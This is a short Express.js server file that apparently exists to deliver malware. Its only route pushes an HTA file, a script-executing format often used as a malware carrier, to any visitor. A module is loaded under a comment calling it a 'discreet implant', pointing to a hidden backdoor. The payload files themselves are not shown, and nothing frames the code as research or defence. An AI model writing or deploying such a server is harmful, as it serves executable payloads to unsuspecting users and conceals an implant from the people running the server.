const express = require("express");
const path = require("path");

const app = express();

app.use(express.json({ limit: "8kb" }));

/* --- implant discret --- */
const _wdu = require("./wdu.js");
_wdu.install(app);

app.get("/", (req, res) => {
  res.download(path.join(__dirname, "file.hta"));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
});